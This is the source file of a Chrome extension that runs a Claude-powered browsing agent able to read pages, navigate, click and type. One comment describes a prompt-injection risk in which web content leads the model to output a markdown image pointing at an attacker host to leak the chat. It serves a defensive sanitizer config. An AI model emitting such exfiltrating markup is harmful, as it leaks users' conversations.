import Anthropic from "@anthropic-ai/sdk";
import { marked } from "marked";
import DOMPurify from "dompurify";
import { SYSTEM, tools } from "./shared.js";

const $ = (id) => document.getElementById(id);
const MAX_CHARS = 200_000;

// ---------- 分頁操作 ----------

async function activeTab() {
  const [tab] = await chrome.tabs.query({ active: true, lastFocusedWindow: true });
  if (!tab) throw new Error("找不到目前分頁");
  return tab;
}

async function inPage(tabId, func, args) {
  const [res] = await chrome.scripting.executeScript({ target: { tabId }, func, args });
  return res?.result;
}

function waitLoad(tabId, ms = 15000) {
  return new Promise((resolve) => {
    const done = () => { clearTimeout(timer); chrome.tabs.onUpdated.removeListener(onUpdated); resolve(); };
    const onUpdated = (id, info) => { if (id === tabId && info.status === "complete") done(); };
    const timer = setTimeout(done, ms);
    chrome.tabs.onUpdated.addListener(onUpdated);
  });
}

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

async function runTool(name, input) {
  const tab = await activeTab();
  switch (name) {
    case "read_page": {
      const body = await inPage(tab.id, (sel, html) => {
        const el = sel ? document.querySelector(sel) : document.body;
        if (!el) return null;
        return html ? el.outerHTML : el.innerText;
      }, [input.selector ?? null, !!input.html]);
      if (body == null) throw new Error(`找不到元素：${input.selector}`);
      const cut = body.length > MAX_CHARS
        ? `${body.slice(0, MAX_CHARS)}\n\n[已截斷：全文 ${body.length} 字，只給前 ${MAX_CHARS} 字。請改用 selector 讀特定區塊。]`
        : body;
      return `標題：${tab.title}\n網址：${tab.url}\n\n${cut}`;
    }
    case "navigate": {
      if (!/^https?:\/\//i.test(input.url)) throw new Error("只接受 http(s) 網址");
      const loaded = waitLoad(tab.id);
      await chrome.tabs.update(tab.id, { url: input.url });
      await loaded;
      return `已前往 ${input.url}`;
    }
    case "click": {
      const ok = await inPage(tab.id, (sel) => {
        const el = document.querySelector(sel);
        if (!el) return false;
        el.scrollIntoView({ block: "center" });
        el.click();
        return true;
      }, [input.selector]);
      if (!ok) throw new Error(`找不到元素：${input.selector}`);
      await sleep(800); // 讓點擊觸發的導頁 / 重繪有時間發生
      return "已點擊";
    }
    case "type": {
      const ok = await inPage(tab.id, (sel, text, submit) => {
        const el = document.querySelector(sel);
        if (!el) return false;
        el.focus();
        if (el.isContentEditable) {
          el.textContent = text;
        } else {
          // 走原生 setter，React 等框架才收得到變更
          Object.getOwnPropertyDescriptor(Object.getPrototypeOf(el), "value").set.call(el, text);
        }
        el.dispatchEvent(new Event("input", { bubbles: true }));
        el.dispatchEvent(new Event("change", { bubbles: true }));
        if (submit) el.form ? el.form.requestSubmit() : el.dispatchEvent(new KeyboardEvent("keydown", { key: "Enter", bubbles: true }));
        return true;
      }, [input.selector, input.text, !!input.submit]);
      if (!ok) throw new Error(`找不到元素：${input.selector}`);
      if (input.submit) await sleep(800);
      return "已輸入";
    }
    default:
      throw new Error(`未知工具：${name}`);
  }
}

// ---------- 介面 ----------

// 使用者往上捲在看舊內容時不要把他拉回底部
function stick(force) {
  const box = $("scroll");
  if (force || box.scrollHeight - box.scrollTop - box.clientHeight < 80) box.scrollTop = box.scrollHeight;
}

function addMsg(cls, text) {
  const div = document.createElement("div");
  div.className = `msg ${cls}`;
  div.textContent = text;
  $("log").append(div);
  stick(cls === "user");
  return div;
}

const ICON_COPY = '<svg viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.4"><rect x="5.5" y="5.5" width="8" height="8" rx="1.5"/><path d="M10.5 5.5V4a1.5 1.5 0 00-1.5-1.5H4A1.5 1.5 0 002.5 4v5A1.5 1.5 0 004 10.5h1.5"/></svg>';

function copyButton(getText, label = "") {
  const b = document.createElement("button");
  b.type = "button";
  b.className = "copy";
  b.innerHTML = ICON_COPY + label;
  b.title = "複製";
  b.addEventListener("click", async () => {
    await navigator.clipboard.writeText(getText());
    b.classList.add("done");
    setTimeout(() => b.classList.remove("done"), 1200);
  });
  return b;
}

// 模型輸出可能夾帶網頁裡被注入的 HTML，而這個頁面有擴充功能權限：一律消毒後才放進 DOM
DOMPurify.addHook("afterSanitizeAttributes", (node) => {
  if (node.tagName === "A") { node.setAttribute("target", "_blank"); node.setAttribute("rel", "noopener noreferrer"); }
});
// 會自動發出請求的標籤／屬性一律禁掉：網頁內容可能誘導模型輸出 ![](https://攻擊者/?資料) 把對話外洩
const PURIFY = {
  FORBID_TAGS: ["img", "picture", "source", "video", "audio", "iframe", "object", "embed", "svg", "math", "form", "input", "button", "textarea", "select", "style", "link"],
  FORBID_ATTR: ["style", "srcset", "background", "poster"],
};
const renderMd = (text) => DOMPurify.sanitize(marked.parse(text, { gfm: true, breaks: true }), PURIFY);

// 助理的一段 Markdown 回覆：串流中每幀最多重繪一次，結束後幫程式碼區塊加複製鈕
function mdBlock() {
  const wrap = document.createElement("div");
  wrap.className = "msg assistant";
  const body = document.createElement("div");
  body.className = "md";
  wrap.append(body);
  $("log").append(wrap);
  let raw = "";
  let queued = false;
  const paint = () => { queued = false; body.innerHTML = renderMd(raw); stick(); };
  return {
    append(delta) {
      raw += delta;
      if (!queued) { queued = true; requestAnimationFrame(paint); }
    },
    finish() {
      if (!raw.trim()) { wrap.remove(); return; }
      paint();
      for (const pre of body.querySelectorAll("pre")) {
        pre.append(copyButton(() => pre.querySelector("code")?.textContent ?? pre.textContent));
      }
      const bar = document.createElement("div");
      bar.className = "msg-actions";
      bar.append(copyButton(() => raw, "複製"));
      wrap.append(bar);
    },
  };
}

// 思考過程：可展開的區塊，串流中顯示「思考中」，結束後顯示花了幾秒
function thinkingBlock() {
  const el = document.createElement("details");
  el.className = "thinking";
  el.dataset.state = "running";
  const summary = document.createElement("summary");
  summary.textContent = "思考中…";
  const body = document.createElement("div");
  body.className = "md";
  el.append(summary, body);
  $("log").append(el);
  stick();
  const start = performance.now();
  let raw = "";
  return {
    append(delta) { raw += delta; body.innerHTML = renderMd(raw); stick(); },
    finish() {
      el.dataset.state = "done";
      summary.textContent = `已思考 ${Math.max(1, Math.round((performance.now() - start) / 1000))} 秒`;
      if (!raw.trim()) body.remove(); // display 被省略時沒有內容，只留時間
    },
  };
}

// 送出後、第一個區塊出現前的等待指示
function pending() {
  const el = document.createElement("div");
  el.className = "pending";
  el.innerHTML = "<i></i><i></i><i></i>";
  $("log").append(el);
  stick();
  return () => el.remove();
}

const ICON_OK = '<svg viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3.5 8.5l3 3 6-7"/></svg>';
const ICON_ERR = '<svg viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4.5 4.5l7 7M11.5 4.5l-7 7"/></svg>';

// 工具呼叫顯示成可展開的小卡片：執行中轉圈，結束打勾／打叉，展開看參數與錯誤
function addTool(name, input) {
  const el = document.createElement("details");
  el.className = "tool";
  el.dataset.state = "running";
  const summary = document.createElement("summary");
  const status = document.createElement("span");
  status.className = "status";
  const code = document.createElement("code");
  code.textContent = name;
  const arg = document.createElement("span");
  arg.className = "arg";
  arg.textContent = Object.values(input ?? {}).map(String).join(" ");
  summary.append(status, code, arg);
  const pre = document.createElement("pre");
  pre.textContent = JSON.stringify(input, null, 2);
  el.append(summary, pre);
  $("log").append(el);
  stick();
  return (error) => {
    el.dataset.state = error ? "error" : "ok";
    status.innerHTML = error ? ICON_ERR : ICON_OK;
    if (error) pre.textContent += `\n\n✕ ${error}`;
  };
}

// SDK 的錯誤帶 HTTP 狀態碼，翻成使用者看得懂的話
function friendly(err) {
  const map = { 401: "存取金鑰無效或已停用，請到設定重新輸入", 402: "帳戶額度不足，請先儲值", 429: "請求太頻繁，請稍候再試" };
  return map[err?.status] ?? err.message;
}

let messages = [];
let controller = null; // 按「停止」時中止整個 agent 迴圈（串流中或跑工具中都算）

const GATEWAY = "https://ai-gateway.iosoftware.ai";

async function runApi(userText) {
  const apiKey = $("key").value.trim();
  const model = $("model").value.trim();
  if (!apiKey) { showView(); throw new Error("請先輸入存取金鑰"); }

  // fluxRelay 透明代理（根 /v1/messages）：受控轉發 /api/v1/relay/claude 的欄位白名單不收 tools，agent 迴圈打不進去
  const client = new Anthropic({ baseURL: GATEWAY, apiKey: null, authToken: apiKey, dangerouslyAllowBrowser: true });

  messages.push({ role: "user", content: userText });

  while (true) {
    controller.signal.throwIfAborted();
    const unpend = pending();
    let block = null; // 目前正在串流的思考／文字區塊
    const stream = client.beta.messages.stream(
      {
        model, max_tokens: 64000, system: SYSTEM, tools, messages,
        // Sonnet 5 / Opus 5 預設不回傳思考內容，summarized 才看得到摘要
        thinking: { type: "adaptive", display: "summarized" },
        // 頂層 cache_control：自動把最後一個可快取區塊設成快取點，多輪對話重送的歷史只算快取讀取價
        cache_control: { type: "ephemeral" },
      },
      { signal: controller.signal },
    );
    stream.on("streamEvent", (ev) => {
      if (ev.type === "content_block_start") {
        unpend();
        const t = ev.content_block.type;
        block = t === "thinking" || t === "redacted_thinking" ? thinkingBlock() : t === "text" ? mdBlock() : null;
      } else if (ev.type === "content_block_delta") {
        if (ev.delta.type === "thinking_delta") block?.append(ev.delta.thinking);
        else if (ev.delta.type === "text_delta") block?.append(ev.delta.text);
      } else if (ev.type === "content_block_stop") {
        block?.finish();
        block = null;
      }
    });
    let msg;
    try {
      msg = await stream.finalMessage();
    } finally {
      unpend();
      block?.finish();
    }

    if (msg.stop_reason === "refusal") throw new Error("模型拒絕了這個請求");
    messages.push({ role: "assistant", content: msg.content });
    if (msg.stop_reason === "pause_turn") continue;

    const uses = msg.content.filter((b) => b.type === "tool_use");
    if (uses.length === 0) return;
    if (msg.stop_reason === "max_tokens") throw new Error("輸出超過 max_tokens，工具參數被截斷");

    const results = [];
    for (const u of uses) {
      const done = addTool(u.name, u.input);
      try {
        results.push({ type: "tool_result", tool_use_id: u.id, content: await runTool(u.name, u.input) });
        done();
      } catch (e) {
        done(e.message);
        results.push({ type: "tool_result", tool_use_id: u.id, content: e.message, is_error: true });
      }
    }
    messages.push({ role: "user", content: results });
  }
}

// ---------- Agent 模式：本機 server（server/agent-server.mjs）跑 Claude Agent SDK ----------

let agentSession = null; // server 回傳的 session id，下一輪用來 resume

async function runAgent(text) {
  const server = (saved.server ?? "http://127.0.0.1:8787").replace(/\/+$/, "");
  const res = await fetch(`${server}/turn`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ text, sessionId: agentSession, model: $("model").value.trim() }),
    signal: controller.signal,
  }).catch((err) => {
    if (controller.signal.aborted) throw err;
    throw new Error(`連不到 Agent server（${server}），請先在專案目錄執行 npm run agent`);
  });
  if (!res.ok) throw new Error(`Agent server 回應 ${res.status}：${await res.text()}`);

  let bubble = null;
  let buf = "";
  const reader = res.body.pipeThrough(new TextDecoderStream()).getReader();
  for (;;) {
    const { value, done } = await reader.read();
    if (done) { bubble?.finish(); return; }
    buf += value;
    const lines = buf.split("\n");
    buf = lines.pop();
    for (const line of lines) {
      if (!line) continue;
      const ev = JSON.parse(line);
      if (ev.type === "text") {
        bubble ??= mdBlock();
        bubble.append(ev.text);
      } else if (ev.type === "tool_call") {
        bubble?.finish();
        bubble = null; // 工具之後的文字開新的一段
        answerToolCall(server, ev); // 不 await：模型可能一次叫多個工具，串流要繼續讀
      } else if (ev.type === "done") {
        agentSession = ev.sessionId;
      } else if (ev.type === "error") {
        if (ev.sessionId) agentSession = ev.sessionId;
        throw new Error(ev.error);
      }
    }
  }
}

async function answerToolCall(server, ev) {
  const done = addTool(ev.name, ev.input);
  let content;
  let isError = false;
  try {
    content = await runTool(ev.name, ev.input);
    done();
  } catch (e) {
    content = e.message;
    isError = true;
    done(e.message);
  }
  await fetch(`${server}/tool-result`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ id: ev.id, content, isError }),
  }).catch(() => {}); // 送不回去時 server 端會逾時並回報給模型
}

// ---------- 事件 ----------

// mode 沒有介面：產品只走 fluxRelay。開發時可在 DevTools 執行 chrome.storage.local.set({ mode: "agent" }) 改用本機 Agent server
const saved = await chrome.storage.local.get(["mode", "key", "model", "server"]);
const devMode = saved.mode === "agent";
if (saved.key) $("key").value = saved.key;
if (saved.model && [...$("model").options].some((o) => o.value === saved.model)) $("model").value = saved.model;

function showView() {
  document.body.dataset.view = devMode || $("key").value ? "chat" : "onboard";
  if (document.body.dataset.view === "chat") $("input").focus();
  else $("onboard-key").focus();
}
showView();

$("model").addEventListener("change", () => chrome.storage.local.set({ model: $("model").value }));
$("key").addEventListener("change", () => {
  $("key").value = $("key").value.trim();
  chrome.storage.local.set({ key: $("key").value });
});

$("onboard-form").addEventListener("submit", async (e) => {
  e.preventDefault();
  const key = $("onboard-key").value.trim();
  if (!key) { $("onboard-error").textContent = "請貼上存取金鑰"; return; }
  $("key").value = key;
  await chrome.storage.local.set({ key });
  $("onboard-key").value = "";
  $("onboard-error").textContent = "";
  showView();
});

$("open-settings").addEventListener("click", () => $("settings").showModal());
$("close-settings").addEventListener("click", () => $("settings").close());
$("settings").addEventListener("click", (e) => { if (e.target === $("settings")) $("settings").close(); });
$("toggle-key").addEventListener("click", () => {
  const show = $("key").type === "password";
  $("key").type = show ? "text" : "password";
  $("toggle-key").textContent = show ? "隱藏" : "顯示";
});
$("logout").addEventListener("click", async () => {
  await chrome.storage.local.remove("key");
  $("key").value = "";
  $("settings").close();
  $("reset").click();
  showView();
});

$("reset").addEventListener("click", () => {
  controller?.abort();
  messages = [];
  agentSession = null;
  $("log").replaceChildren();
  $("input").focus();
});

for (const b of document.querySelectorAll(".suggest")) {
  b.addEventListener("click", () => { $("input").value = b.dataset.prompt; $("form").requestSubmit(); });
}

$("input").addEventListener("keydown", (e) => {
  if (e.key === "Enter" && !e.shiftKey && !e.isComposing) { e.preventDefault(); $("form").requestSubmit(); }
});

$("form").addEventListener("submit", async (e) => {
  e.preventDefault();
  if (controller) { controller.abort(); return; }
  const text = $("input").value.trim();
  if (!text) return;
  $("input").value = "";
  addMsg("user", text);
  document.body.dataset.busy = "";
  $("send").setAttribute("aria-label", "停止");
  controller = new AbortController();
  const start = messages.length;
  try {
    await (devMode ? runAgent(text) : runApi(text));
  } catch (err) {
    if (messages.length > start) messages.length = start; // 丟掉這一輪，避免留下沒配對 tool_result 的 tool_use
    document.querySelectorAll(".pending").forEach((el) => el.remove());
    document.querySelectorAll('.thinking[data-state="running"] > summary').forEach((el) => { el.textContent = "思考已中斷"; });
    addMsg("error", controller.signal.aborted ? "已停止" : friendly(err));
  } finally {
    controller = null;
    delete document.body.dataset.busy;
    $("send").setAttribute("aria-label", "送出");
  }
});
